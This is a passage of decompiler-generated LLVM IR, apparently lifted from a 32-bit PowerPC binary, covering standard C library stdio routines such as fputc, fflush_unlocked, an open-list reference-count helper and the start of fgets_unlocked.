  store i32 %v4_1001b57c, i32* @r31, align 4
  store i32 %v2_1001b550, i32* @r3, align 4
  %v0_1001b58c = load i1, i1* %cr4_eq.global-to-local, align 1
  br i1 %v0_1001b58c, label %dec_label_pc_1001b590, label %dec_label_pc_1001b594

dec_label_pc_1001b590:                            ; preds = %dec_label_pc_1001b570
  store i32 268547476, i32* @lr, align 4
  %v0_1001b590 = call i32 @__pthread_cleanup_pop_restore()
  %v0_1001b598.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_1001b594

dec_label_pc_1001b594:                            ; preds = %dec_label_pc_1001b570, %dec_label_pc_1001b590
  %v0_1001b598 = phi i32 [ %v4_1001b57c, %dec_label_pc_1001b570 ], [ %v0_1001b598.pre, %dec_label_pc_1001b590 ]
  %v1_1001b5a8 = call %0 @__asm_mtcrf(i32 8, i32 %v0_1001b528)
  %v9_1001b5a8 = extractvalue %0 %v1_1001b5a8, 7
  store i4 %v9_1001b5a8, i4* @cr4, align 1
  ret i32 %v0_1001b598

; uselistorder directives
  uselistorder i32 %v0_1001b528, { 1, 0, 2 }
  uselistorder i32 %arg3, { 0, 2, 1 }
  uselistorder label %dec_label_pc_1001b594, { 1, 0 }
  uselistorder label %dec_label_pc_1001b570, { 1, 0 }
}

define i32 @__GI_fputc(i8 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r11.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  %tmp = sext i8 %arg1 to i32
  %stack_var_-40 = alloca i32, align 4
  %v1_1001b5c0 = add i32 %arg2, 56
  store i32 %v1_1001b5c0, i32* %r30.global-to-local, align 4
  store i32 %tmp, i32* @r29, align 4
  %v1_1001b5d4 = add i32 %arg2, 52
  %v2_1001b5d4 = inttoptr i32 %v1_1001b5d4 to i32*
  %v3_1001b5d4 = load i32, i32* %v2_1001b5d4, align 4
  %v3_1001b5d8 = icmp eq i32 %v3_1001b5d4, 0
  br i1 %v3_1001b5d8, label %dec_label_pc_1001b610, label %dec_label_pc_1001b5e0

dec_label_pc_1001b5e0:                            ; preds = %entry
  %v1_1001b5e0 = add i32 %arg2, 16
  %v2_1001b5e0 = inttoptr i32 %v1_1001b5e0 to i32*
  %v3_1001b5e0 = load i32, i32* %v2_1001b5e0, align 4
  %v1_1001b5e41 = zext i8 %arg1 to i32
  store i32 %v1_1001b5e41, i32* @r30, align 4
  %v1_1001b5e8 = add i32 %arg2, 28
  %v2_1001b5e8 = inttoptr i32 %v1_1001b5e8 to i32*
  %v3_1001b5e8 = load i32, i32* %v2_1001b5e8, align 4
  %v2_1001b5ec = add i32 %v3_1001b5e0, 1
  store i32 %v2_1001b5ec, i32* %r11.global-to-local, align 4
  %v3_1001b5f0 = icmp ult i32 %v3_1001b5e0, %v3_1001b5e8
  br i1 %v3_1001b5f0, label %dec_label_pc_1001b5f8, label %dec_label_pc_1001b604

dec_label_pc_1001b5f8:                            ; preds = %dec_label_pc_1001b5e0
  %v4_1001b5e0 = inttoptr i32 %v3_1001b5e0 to i8*
  store i8 %arg1, i8* %v4_1001b5e0, align 1
  %v0_1001b5fc = load i32, i32* %r11.global-to-local, align 4
  store i32 %v0_1001b5fc, i32* %v2_1001b5e0, align 4
  br label %dec_label_pc_1001b668

dec_label_pc_1001b604:                            ; preds = %dec_label_pc_1001b5e0
  store i32 268547592, i32* @lr, align 4
  %v4_1001b604 = trunc i32 %v1_1001b5c0 to i8
  %v5_1001b604 = call i32 @putc_unlocked(i8 %v4_1001b604, i32 %v3_1001b5e0, i32 %v1_1001b5c0)
  store i32 %v5_1001b604, i32* @r30, align 4
  br label %dec_label_pc_1001b668

dec_label_pc_1001b610:                            ; preds = %entry
  %v2_1001b614 = ptrtoint i32* %stack_var_-40 to i32
  %v4_1001b61c = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-40, i32 add (i32 ptrtoint (i32* @global_var_10010000.20 to i32), i32 26856), i32 %v1_1001b5c0)
  %v0_1001b620 = load i32, i32* %r30.global-to-local, align 4
  store i32 268547624, i32* @lr, align 4
  %v1_1001b624 = call i32 @pthread_mutex_lock(i32 %v0_1001b620)
  %v0_1001b628 = load i32, i32* @r31, align 4
  %v1_1001b628 = add i32 %v0_1001b628, 16
  %v2_1001b628 = inttoptr i32 %v1_1001b628 to i32*
  %v3_1001b628 = load i32, i32* %v2_1001b628, align 4
  %v1_1001b62c = add i32 %v0_1001b628, 28
  %v2_1001b62c = inttoptr i32 %v1_1001b62c to i32*
  %v3_1001b62c = load i32, i32* %v2_1001b62c, align 4
  %v2_1001b634 = add i32 %v3_1001b628, 1
  store i32 %v2_1001b634, i32* %r11.global-to-local, align 4
  %v0_1001b638 = load i32, i32* @r29, align 4
  %v1_1001b638 = urem i32 %v0_1001b638, 256
  store i32 %v1_1001b638, i32* %r30.global-to-local, align 4
  %v3_1001b63c = icmp ult i32 %v3_1001b628, %v3_1001b62c
  br i1 %v3_1001b63c, label %dec_label_pc_1001b648, label %dec_label_pc_1001b654

dec_label_pc_1001b648:                            ; preds = %dec_label_pc_1001b610
  %v4_1001b628 = inttoptr i32 %v3_1001b628 to i8*
  %v1_1001b648 = trunc i32 %v0_1001b638 to i8
  store i8 %v1_1001b648, i8* %v4_1001b628, align 1
  %v0_1001b64c = load i32, i32* %r11.global-to-local, align 4
  %v1_1001b64c = load i32, i32* @r31, align 4
  %v2_1001b64c = add i32 %v1_1001b64c, 16
  %v3_1001b64c = inttoptr i32 %v2_1001b64c to i32*
  store i32 %v0_1001b64c, i32* %v3_1001b64c, align 4
  br label %dec_label_pc_1001b65c

dec_label_pc_1001b654:                            ; preds = %dec_label_pc_1001b610
  %v1_1001b640 = trunc i32 %v0_1001b638 to i8
  store i32 268547672, i32* @lr, align 4
  %v6_1001b654 = call i32 @putc_unlocked(i8 %v1_1001b640, i32 %v0_1001b628, i32 %v3_1001b628)
  store i32 %v6_1001b654, i32* %r30.global-to-local, align 4
  br label %dec_label_pc_1001b65c

dec_label_pc_1001b65c:                            ; preds = %dec_label_pc_1001b648, %dec_label_pc_1001b654
  store i32 %v2_1001b614, i32* @r3, align 4
  store i32 1, i32* @r4, align 4
  store i32 268547688, i32* @lr, align 4
  %v0_1001b664 = call i32 @__pthread_cleanup_pop_restore()
  br label %dec_label_pc_1001b668

dec_label_pc_1001b668:                            ; preds = %dec_label_pc_1001b604, %dec_label_pc_1001b5f8, %dec_label_pc_1001b65c
  %v0_1001b66c = load i32, i32* @r30, align 4
  ret i32 %v0_1001b66c

; uselistorder directives
  uselistorder i32 %v0_1001b638, { 2, 1, 0 }
  uselistorder i32 %v3_1001b628, { 0, 3, 1, 2 }
  uselistorder i32 %v0_1001b628, { 1, 0, 2 }
  uselistorder i32 %v3_1001b5e0, { 0, 3, 1, 2 }
  uselistorder i32 %v1_1001b5c0, { 0, 2, 1, 3 }
  uselistorder i32 (i8, i32, i32)* @putc_unlocked, { 6, 7, 0, 1, 2, 3, 4, 5, 8, 9 }
  uselistorder i32 %arg2, { 0, 3, 1, 2 }
  uselistorder i8 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1001b668, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1001b65c, { 1, 0 }
}

define i32 @_stdio_openlist_dec_use() local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_10044d78.1134 to i32), i32* @r29, align 4
  %v2_1001b6a4 = ptrtoint i32* %stack_var_-56 to i32
  %v4_1001b6ac = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-56, i32 add (i32 ptrtoint (i32* @global_var_10010000.20 to i32), i32 26856), i32 ptrtoint (i32* @global_var_10044d78.1134 to i32))
  %v0_1001b6b0 = load i32, i32* @r29, align 4
  store i32 268547768, i32* @lr, align 4
  %v1_1001b6b4 = call i32 @pthread_mutex_lock(i32 %v0_1001b6b0)
  %v3_1001b6bc = load i32, i32* @global_var_10045238.1135, align 4
  %v3_1001b6c0 = icmp eq i32 %v3_1001b6bc, 1
  br i1 %v3_1001b6c0, label %dec_label_pc_1001b6c8, label %dec_label_pc_1001b770

dec_label_pc_1001b6c8:                            ; preds = %entry
  %v3_1001b6cc = load i16*, i16** @global_var_1004523c.1136, align 4
  %v2_1001b6d0 = icmp sgt i16* %v3_1001b6cc, null
  br i1 %v2_1001b6d0, label %dec_label_pc_1001b6d8, label %dec_label_pc_1001b770

dec_label_pc_1001b6d8:                            ; preds = %dec_label_pc_1001b6c8
  %v0_1001b6dc = load i32, i32* @r31, align 4
  %v2_1001b6e4 = ptrtoint i32* %stack_var_-40 to i32
  store i32 0, i32* @r30, align 4
  %v4_1001b6f0 = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-40, i32 %v0_1001b6dc, i32 ptrtoint (i32* @global_var_10044d60.1156 to i32))
  store i32 268547836, i32* @lr, align 4
  %v1_1001b6f8 = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_10044d60.1156 to i32))
  %storemerge7 = load i32, i32* bitcast (i32** @global_var_10045148.998 to i32*), align 4
  store i32 %storemerge7, i32* @r29, align 4
  %v3_1001b75010 = icmp eq i32 %storemerge7, 0
  %v0_1001b75411 = load i32, i32* @r30, align 4
  br i1 %v3_1001b75010, label %dec_label_pc_1001b75c, label %dec_label_pc_1001b708

dec_label_pc_1001b708:                            ; preds = %dec_label_pc_1001b6d8, %dec_label_pc_1001b750.backedge
  %v0_1001b75416 = phi i32 [ %v0_1001b754, %dec_label_pc_1001b750.backedge ], [ %v0_1001b75411, %dec_label_pc_1001b6d8 ]
  %v3_1001b75417.in = phi i32 [ %v0_1001b754, %dec_label_pc_1001b750.backedge ], [ %v0_1001b75411, %dec_label_pc_1001b6d8 ]
  %storemerge15 = phi i32 [ %storemerge, %dec_label_pc_1001b750.backedge ], [ %storemerge7, %dec_label_pc_1001b6d8 ]
  %v1_1001b708 = inttoptr i32 %storemerge15 to i16*
  %v2_1001b708 = load i16, i16* %v1_1001b708, align 2
  %v1_1001b70c = add i32 %storemerge15, 32
  %v2_1001b70c = inttoptr i32 %v1_1001b70c to i32*
  %v3_1001b70c = load i32, i32* %v2_1001b70c, align 4
  store i32 %v3_1001b70c, i32* @r31, align 4
  %v1_1001b710 = and i16 %v2_1001b708, -32720
  %v3_1001b714 = icmp eq i16 %v1_1001b710, 48
  br i1 %v3_1001b714, label %dec_label_pc_1001b724, label %dec_label_pc_1001b71c

dec_label_pc_1001b71c:                            ; preds = %dec_label_pc_1001b708
  store i32 %storemerge15, i32* @r30, align 4
  br label %dec_label_pc_1001b750.backedge

dec_label_pc_1001b724:                            ; preds = %dec_label_pc_1001b708
  %v3_1001b75417 = icmp eq i32 %v3_1001b75417.in, 0
  br i1 %v3_1001b75417, label %dec_label_pc_1001b728, label %dec_label_pc_1001b734

dec_label_pc_1001b728:                            ; preds = %dec_label_pc_1001b724
  store i32 %v3_1001b70c, i32* bitcast (i32** @global_var_10045148.998 to i32*), align 4
  br label %dec_label_pc_1001b738

dec_label_pc_1001b734:                            ; preds = %dec_label_pc_1001b724
  %v2_1001b734 = add i32 %v0_1001b75416, 32
  %v3_1001b734 = inttoptr i32 %v2_1001b734 to i32*
  store i32 %v3_1001b70c, i32* %v3_1001b734, align 4
  %v0_1001b738.pre = load i32, i32* @r29, align 4
  br label %dec_label_pc_1001b738

dec_label_pc_1001b738:                            ; preds = %dec_label_pc_1001b728, %dec_label_pc_1001b734
  %v0_1001b738 = phi i32 [ %storemerge15, %dec_label_pc_1001b728 ], [ %v0_1001b738.pre, %dec_label_pc_1001b734 ]
  %v1_1001b738 = inttoptr i32 %v0_1001b738 to i16*
  %v2_1001b738 = load i16, i16* %v1_1001b738, align 2
  store i32 %v0_1001b738, i32* @r3, align 4
  %v1_1001b740 = and i16 %v2_1001b738, 8192
  %v3_1001b740 = icmp eq i16 %v1_1001b740, 0
  br i1 %v3_1001b740, label %dec_label_pc_1001b750.backedge, label %dec_label_pc_1001b748

dec_label_pc_1001b750.backedge:                   ; preds = %dec_label_pc_1001b738, %dec_label_pc_1001b71c, %dec_label_pc_1001b748
  %storemerge = load i32, i32* @r31, align 4
  store i32 %storemerge, i32* @r29, align 4
  %v3_1001b750 = icmp eq i32 %storemerge, 0
  %v0_1001b754 = load i32, i32* @r30, align 4
  br i1 %v3_1001b750, label %dec_label_pc_1001b75c, label %dec_label_pc_1001b708

dec_label_pc_1001b748:                            ; preds = %dec_label_pc_1001b738
  store i32 268547916, i32* @lr, align 4
  %v0_1001b748 = call i32 @free()
  br label %dec_label_pc_1001b750.backedge

dec_label_pc_1001b75c:                            ; preds = %dec_label_pc_1001b750.backedge, %dec_label_pc_1001b6d8
  store i32 %v2_1001b6e4, i32* @r3, align 4
  store i32 1, i32* @r4, align 4
  store i32 268547944, i32* @lr, align 4
  %v0_1001b764 = call i32 @__pthread_cleanup_pop_restore()
  %v0_1001b76c = load i32, i32* @r29, align 4
  %v4_1001b76c = inttoptr i32 %v0_1001b76c to i16*
  store i16* %v4_1001b76c, i16** @global_var_1004523c.1136, align 4
  %v3_1001b778.pre = load i32, i32* @global_var_10045238.1135, align 4
  br label %dec_label_pc_1001b770

dec_label_pc_1001b770:                            ; preds = %dec_label_pc_1001b6c8, %entry, %dec_label_pc_1001b75c
  %v3_1001b778 = phi i32 [ 1, %dec_label_pc_1001b6c8 ], [ %v3_1001b6bc, %entry ], [ %v3_1001b778.pre, %dec_label_pc_1001b75c ]
  store i32 %v2_1001b6a4, i32* @r3, align 4
  store i32 1, i32* @r4, align 4
  %v1_1001b780 = add i32 %v3_1001b778, -1
  store i32 %v1_1001b780, i32* @global_var_10045238.1135, align 4
  store i32 268547980, i32* @lr, align 4
  %v0_1001b788 = call i32 @__pthread_cleanup_pop_restore()
  ret i32 %v0_1001b788

; uselistorder directives
  uselistorder i32 %v0_1001b754, { 1, 0 }
  uselistorder i32 %storemerge, { 1, 2, 0 }
  uselistorder i32 %v0_1001b738, { 1, 0 }
  uselistorder i32 %v3_1001b70c, { 1, 0, 2 }
  uselistorder i32 %storemerge15, { 3, 2, 0, 1 }
  uselistorder i32* bitcast (i32** @global_var_10045148.998 to i32*), { 4, 0, 1, 2, 5, 6, 3, 7 }
  uselistorder i16** @global_var_1004523c.1136, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_1001b770, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1001b750.backedge, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1001b738, { 1, 0 }
  uselistorder label %dec_label_pc_1001b708, { 1, 0 }
}

define i32 @fflush_unlocked(i16* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* @r3, align 4
  %stack_var_-40 = alloca i32, align 4
  store i32 ptrtoint (i32** @global_var_10045148.998 to i32), i32* %r9.global-to-local, align 4
  %v5_1001b7b0 = icmp eq i16* %arg1, bitcast (i32** @global_var_10045148.998 to i16*)
  store i32 %tmp, i32* @r29, align 4
  store i32 0, i32* @r27, align 4
  br i1 %v5_1001b7b0, label %dec_label_pc_1001b7d4, label %dec_label_pc_1001b7c8

dec_label_pc_1001b7c8:                            ; preds = %entry
  %v4_1001b7c8 = icmp eq i16* %arg1, null
  store i32 256, i32* @r27, align 4
  br i1 %v4_1001b7c8, label %dec_label_pc_1001b7d4, label %dec_label_pc_1001b900

dec_label_pc_1001b7d4:                            ; preds = %dec_label_pc_1001b7c8, %entry
  store i32 ptrtoint (i32* @global_var_10010000.20 to i32), i32* %r9.global-to-local, align 4
  %v2_1001b7e0 = ptrtoint i32* %stack_var_-40 to i32
  %v4_1001b7f4 = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-40, i32 add (i32 ptrtoint (i32* @global_var_10010000.20 to i32), i32 26856), i32 ptrtoint (i32* @global_var_10044d78.1134 to i32))
  store i32 268548096, i32* @lr, align 4
  %v1_1001b7fc = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_10044d78.1134 to i32))
  %v3_1001b804 = load i32, i32* @global_var_10045238.1135, align 4
  store i32 %v2_1001b7e0, i32* @r3, align 4
  store i32 1, i32* @r4, align 4
  %v1_1001b814 = add i32 %v3_1001b804, 1
  store i32 %v1_1001b814, i32* %r9.global-to-local, align 4
  store i32 %v1_1001b814, i32* @global_var_10045238.1135, align 4
  store i32 268548132, i32* @lr, align 4
  %v0_1001b820 = call i32 @__pthread_cleanup_pop_restore()
  %v0_1001b824 = load i32, i32* @r30, align 4
  %v4_1001b830 = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-40, i32 %v0_1001b824, i32 ptrtoint (i32* @global_var_10044d60.1156 to i32))
  store i32 268548156, i32* @lr, align 4
  %v1_1001b838 = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_10044d60.1156 to i32))
  store i32 268697600, i32* %r9.global-to-local, align 4
  store i32 %v2_1001b7e0, i32* @r3, align 4
  store i32 1, i32* @r4, align 4
  store i32 0, i32* @r28, align 4
  store i32 ptrtoint (i32* @global_var_1001b854.1180 to i32), i32* @lr, align 4
  %v0_1001b850 = call i32 @__pthread_cleanup_pop_restore()
  %v0_1001b8f0.pr = load i32, i32* @r31, align 4
  %v3_1001b8f03 = icmp eq i32 %v0_1001b8f0.pr, 0
  br i1 %v3_1001b8f03, label %dec_label_pc_1001b8f8, label %dec_label_pc_1001b858

dec_label_pc_1001b858:                            ; preds = %dec_label_pc_1001b7d4, %dec_label_pc_1001b8ec
  %v0_1001b874 = phi i32 [ %v3_1001b8ec, %dec_label_pc_1001b8ec ], [ %v0_1001b8f0.pr, %dec_label_pc_1001b7d4 ]
  %v1_1001b858 = inttoptr i32 %v0_1001b874 to i16*
  %v2_1001b858 = load i16, i16* %v1_1001b858, align 2
  %v3_1001b858 = zext i16 %v2_1001b858 to i32
  %v1_1001b85c = and i32 %v3_1001b858, 64
  store i32 %v1_1001b85c, i32* %r9.global-to-local, align 4
  %v3_1001b85c = icmp eq i32 %v1_1001b85c, 0
  br i1 %v3_1001b85c, label %dec_label_pc_1001b8ec, label %dec_label_pc_1001b864

dec_label_pc_1001b864:                            ; preds = %dec_label_pc_1001b858
  store i32 268697600, i32* %r9.global-to-local, align 4
  %v3_1001b868 = load i32, i32* @global_var_1004514c.999, align 4
  %v3_1001b86c = icmp eq i32 %v3_1001b868, 2
  br i1 %v3_1001b86c, label %dec_label_pc_1001b890, label %dec_label_pc_1001b874

dec_label_pc_1001b874:                            ; preds = %dec_label_pc_1001b864
  %v1_1001b874 = add i32 %v0_1001b874, 56
  %v0_1001b87c = load i32, i32* @r30, align 4
  %v4_1001b884 = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-40, i32 %v0_1001b87c, i32 %v1_1001b874)
  store i32 268548240, i32* @lr, align 4
  %v1_1001b88c = call i32 @pthread_mutex_lock(i32 %v1_1001b874)
  %v0_1001b890.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_1001b890

dec_label_pc_1001b890:                            ; preds = %dec_label_pc_1001b864, %dec_label_pc_1001b874
  %v0_1001b8a4 = phi i32 [ %v0_1001b874, %dec_label_pc_1001b864 ], [ %v0_1001b890.pre, %dec_label_pc_1001b874 ]
  %v1_1001b890 = inttoptr i32 %v0_1001b8a4 to i16*
  %v2_1001b890 = load i16, i16* %v1_1001b890, align 2
  %v3_1001b890 = zext i16 %v2_1001b890 to i32
  %v0_1001b894 = load i32, i32* @r27, align 4
  %v2_1001b894 = or i32 %v0_1001b894, %v3_1001b890
  %v1_1001b898 = and i32 %v2_1001b894, 832
  %v1_1001b89c = xor i32 %v1_1001b898, 320
  store i32 %v1_1001b89c, i32* %r9.global-to-local, align 4
  %v3_1001b89c = icmp eq i32 %v1_1001b89c, 0
  br i1 %v3_1001b89c, label %dec_label_pc_1001b8a4, label %dec_label_pc_1001b8d0

dec_label_pc_1001b8a4:                            ; preds = %dec_label_pc_1001b890
  store i32 %v0_1001b8a4, i32* @r3, align 4
  store i32 268548268, i32* @lr, align 4
  %v0_1001b8a8 = call i32 @__stdio_wcommit()
  %v3_1001b8ac = icmp eq i32 %v0_1001b8a8, 0
  br i1 %v3_1001b8ac, label %dec_label_pc_1001b8bc, label %dec_label_pc_1001b8b4

dec_label_pc_1001b8b4:                            ; preds = %dec_label_pc_1001b8a4
  store i32 -1, i32* @r28, align 4
  br label %dec_label_pc_1001b8d0

dec_label_pc_1001b8bc:                            ; preds = %dec_label_pc_1001b8a4
  %v0_1001b8bc = load i32, i32* @r31, align 4
  %v1_1001b8bc = inttoptr i32 %v0_1001b8bc to i16*
  %v2_1001b8bc = load i16, i16* %v1_1001b8bc, align 2
  %v3_1001b8bc = zext i16 %v2_1001b8bc to i32
  %v1_1001b8c0 = add i32 %v0_1001b8bc, 8
  %v2_1001b8c0 = inttoptr i32 %v1_1001b8c0 to i32*
  %v3_1001b8c0 = load i32, i32* %v2_1001b8c0, align 4
  store i32 %v3_1001b8c0, i32* %r9.global-to-local, align 4
  %v1_1001b8c4 = call i32 @__asm_rlwinm(i32 %v3_1001b8bc, i32 0, i32 26, i32 24)
  %v2_1001b8c4 = trunc i32 %v1_1001b8c4 to i16
  %v1_1001b8c8 = load i32, i32* @r31, align 4
  %v2_1001b8c8 = add i32 %v1_1001b8c8, 28
  %v3_1001b8c8 = inttoptr i32 %v2_1001b8c8 to i32*
  store i32 %v3_1001b8c0, i32* %v3_1001b8c8, align 4
  %v3_1001b8cc = load i32, i32* @r31, align 4
  %v4_1001b8cc = inttoptr i32 %v3_1001b8cc to i16*
  store i16 %v2_1001b8c4, i16* %v4_1001b8cc, align 2
  br label %dec_label_pc_1001b8d0

dec_label_pc_1001b8d0:                            ; preds = %dec_label_pc_1001b890, %dec_label_pc_1001b8b4, %dec_label_pc_1001b8bc
  store i32 268697600, i32* %r9.global-to-local, align 4
  %v3_1001b8d4 = load i32, i32* @global_var_1004514c.999, align 4
  %v3_1001b8d8 = icmp eq i32 %v3_1001b8d4, 2
  br i1 %v3_1001b8d8, label %dec_label_pc_1001b8ec, label %dec_label_pc_1001b8e0

dec_label_pc_1001b8e0:                            ; preds = %dec_label_pc_1001b8d0
  store i32 %v2_1001b7e0, i32* @r3, align 4
  store i32 1, i32* @r4, align 4
  store i32 268548332, i32* @lr, align 4
  %v0_1001b8e8 = call i32 @__pthread_cleanup_pop_restore()
  br label %dec_label_pc_1001b8ec

dec_label_pc_1001b8ec:                            ; preds = %dec_label_pc_1001b8d0, %dec_label_pc_1001b858, %dec_label_pc_1001b8e0
  %v0_1001b8ec = load i32, i32* @r31, align 4
  %v1_1001b8ec = add i32 %v0_1001b8ec, 32
  %v2_1001b8ec = inttoptr i32 %v1_1001b8ec to i32*
  %v3_1001b8ec = load i32, i32* %v2_1001b8ec, align 4
  store i32 %v3_1001b8ec, i32* @r31, align 4
  %v3_1001b8f0 = icmp eq i32 %v3_1001b8ec, 0
  br i1 %v3_1001b8f0, label %dec_label_pc_1001b8f8, label %dec_label_pc_1001b858

dec_label_pc_1001b8f8:                            ; preds = %dec_label_pc_1001b8ec, %dec_label_pc_1001b7d4
  store i32 ptrtoint (i32* @global_var_1001b8fc.1181 to i32), i32* @lr, align 4
  %v0_1001b8f8 = call i32 @_stdio_openlist_dec_use()
  br label %dec_label_pc_1001b938

dec_label_pc_1001b900:                            ; preds = %dec_label_pc_1001b7c8
  %v3_1001b900 = load i16, i16* %arg1, align 2
  %v4_1001b900 = zext i16 %v3_1001b900 to i32
  store i32 0, i32* @r28, align 4
  %v1_1001b908 = and i32 %v4_1001b900, 64
  store i32 %v1_1001b908, i32* %r9.global-to-local, align 4
  %v3_1001b908 = icmp eq i32 %v1_1001b908, 0
  br i1 %v3_1001b908, label %dec_label_pc_1001b938, label %dec_label_pc_1001b910

dec_label_pc_1001b910:                            ; preds = %dec_label_pc_1001b900
  store i32 268548372, i32* @lr, align 4
  %v0_1001b910 = call i32 @__stdio_wcommit()
  store i32 -1, i32* @r28, align 4
  %v3_1001b918 = icmp eq i32 %v0_1001b910, 0
  br i1 %v3_1001b918, label %dec_label_pc_1001b920, label %dec_label_pc_1001b938

dec_label_pc_1001b920:                            ; preds = %dec_label_pc_1001b910
  %v0_1001b920 = load i32, i32* @r29, align 4
  %v1_1001b920 = inttoptr i32 %v0_1001b920 to i16*
  %v2_1001b920 = load i16, i16* %v1_1001b920, align 2
  %v3_1001b920 = zext i16 %v2_1001b920 to i32
  store i32 0, i32* @r28, align 4
  %v1_1001b928 = add i32 %v0_1001b920, 8
  %v2_1001b928 = inttoptr i32 %v1_1001b928 to i32*
  %v3_1001b928 = load i32, i32* %v2_1001b928, align 4
  store i32 %v3_1001b928, i32* %r9.global-to-local, align 4
  %v1_1001b92c = call i32 @__asm_rlwinm(i32 %v3_1001b920, i32 0, i32 26, i32 24)
  %v2_1001b92c = trunc i32 %v1_1001b92c to i16
  %v3_1001b930 = load i32, i32* @r29, align 4
  %v4_1001b930 = inttoptr i32 %v3_1001b930 to i16*
  store i16 %v2_1001b92c, i16* %v4_1001b930, align 2
  %v0_1001b934 = load i32, i32* %r9.global-to-local, align 4
  %v1_1001b934 = load i32, i32* @r29, align 4
  %v2_1001b934 = add i32 %v1_1001b934, 28
  %v3_1001b934 = inttoptr i32 %v2_1001b934 to i32*
  store i32 %v0_1001b934, i32* %v3_1001b934, align 4
  br label %dec_label_pc_1001b938

dec_label_pc_1001b938:                            ; preds = %dec_label_pc_1001b910, %dec_label_pc_1001b900, %dec_label_pc_1001b8f8, %dec_label_pc_1001b920
  %v0_1001b93c = load i32, i32* @r28, align 4
  ret i32 %v0_1001b93c

; uselistorder directives
  uselistorder i32 %v3_1001b8ec, { 1, 2, 0 }
  uselistorder i32 %v1_1001b89c, { 1, 0 }
  uselistorder i32* %r9.global-to-local, { 0, 1, 2, 3, 4, 5, 7, 6, 8, 9, 10, 11 }
  uselistorder i32 ()* @_stdio_openlist_dec_use, { 1, 0 }
  uselistorder i32* @global_var_10045238.1135, { 1, 2, 3, 0, 4, 5, 6 }
  uselistorder i32 ptrtoint (i32* @global_var_10044d78.1134 to i32), { 0, 3, 2, 5, 6, 1, 4, 7, 8 }
  uselistorder i16* %arg1, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_1001b938, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_1001b8ec, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1001b8d0, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1001b890, { 1, 0 }
  uselistorder label %dec_label_pc_1001b858, { 1, 0 }
}

define i32 @__GI_fgets_unlocked(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %cr6_eq.global-to-local = alloca i1, align 1
  %cr7_eq.global-to-local = alloca i1, align 1
  %r11.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %arg2, i32* @r29, align 4
  store i32 %tmp, i32* @r28, align 4
  store i32 %arg3, i32* @r30, align 4
  %tmp19 = icmp slt i32 %arg2, 1
  br i1 %tmp19, label %dec_label_pc_1001b9f8, label %dec_label_pc_1001b970

dec_label_pc_1001b970:                            ; preds = %entry
  store i32 %tmp, i32* @r31, align 4
  %v2_1001b9d83 = add i32 %arg2, -1
  store i32 %v2_1001b9d83, i32* @r29, align 4
  %v4_1001b9e09 = icmp eq i32 %arg2, 1
  br i1 %v4_1001b9e09, label %dec_label_pc_1001b9e4, label %dec_label_pc_1001b978

dec_label_pc_1001b978:                            ; preds = %dec_label_pc_1001b970, %dec_label_pc_1001b9d8.backedge
  %v2_1001b994 = phi i32 [ %v2_1001b99412, %dec_label_pc_1001b9d8.backedge ], [ %tmp, %dec_label_pc_1001b970 ]
  %v0_1001b978 = phi i32 [ %v0_1001b9dc, %dec_label_pc_1001b9d8.backedge ], [ %arg3, %dec_label_pc_1001b970 ]
  %v1_1001b978 = add i32 %v0_1001b978, 16
  %v2_1001b978 = inttoptr i32 %v1_1001b978 to i32*
  %v3_1001b978 = load i32, i32* %v2_1001b978, align 4
  %v1_1001b97c = add i32 %v0_1001b978, 24
  %v2_1001b97c = inttoptr i32 %v1_1001b97c to i32*
  %v3_1001b97c = load i32, i32* %v2_1001b97c, align 4
  %v2_1001b980 = add i32 %v3_1001b978, 1
  store i32 %v2_1001b980, i32* %r11.global-to-local, align 4
  %v3_1001b984 = icmp ult i32 %v3_1001b978, %v3_1001b97c
  %v5_1001b984 = icmp eq i32 %v3_1001b978, %v3_1001b97c
  store i1 %v5_1001b984, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1001b984, label %dec_label_pc_1001b98c, label %dec_label_pc_1001b9a8

dec_label_pc_1001b98c:                            ; preds = %dec_label_pc_1001b978
  %v4_1001b978 = inttoptr i32 %v3_1001b978 to i8*
  %v3_1001b98c = load i8, i8* %v4_1001b978, align 1
  %v3_1001b990 = icmp eq i8 %v3_1001b98c, 10
  store i1 %v3_1001b990, i1* %cr7_eq.global-to-local, align 1
  %v3_1001b994 = inttoptr i32 %v2_1001b994 to i8*
  store i8 %v3_1001b98c, i8* %v3_1001b994, align 1
  %v0_1001b998 = load i32, i32* %r11.global-to-local, align 4
  %v1_1001b998 = load i32, i32* @r30, align 4
  %v2_1001b998 = add i32 %v1_1001b998, 16
  %v3_1001b998 = inttoptr i32 %v2_1001b998 to i32*
  store i32 %v0_1001b998, i32* %v3_1001b998, align 4
  %v0_1001b99c = load i32, i32* @r31, align 4
  %v1_1001b99c = add i32 %v0_1001b99c, 1
  store i32 %v1_1001b99c, i32* @r31, align 4
